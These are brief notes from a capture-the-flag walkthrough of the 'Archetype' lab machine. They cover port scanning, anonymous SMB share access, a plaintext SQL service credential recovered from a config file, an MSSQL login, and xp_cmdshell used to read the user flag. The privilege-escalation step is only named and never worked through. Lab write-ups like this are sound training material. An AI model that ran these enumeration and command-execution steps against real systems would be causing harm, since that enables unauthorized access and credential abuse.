# Archetype 

> Easy | Windows 

<br>

### Process:
1) run autorecon
- `sudo python3 autorecon 10.10.10.27`
- found:
  - 135,139,445 (NetBIOS)
  - 1433 (mssql)

<br>

2a) enumerate 135,139,445 (NetBIOS):
- found share "backups" that was read only
  - connect and inspect with no password: `smbclient //10.10.10.27/backups -N`
  - found "prod.dtsConfig" -- contains password information for sql:
    - ARCHETYPE\sql_svc:M3g4c0rp123
- found share "IPC$" that was read only

<br>

3) try to login to mssql service:
- `python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth` -- sucess
  
4) get user flag:
- `EXEC xp_cmdshell 'type C:\Users\sql_srv\Desktop\user.txt`

<br>

5) get admin flag:
- escalate privileges

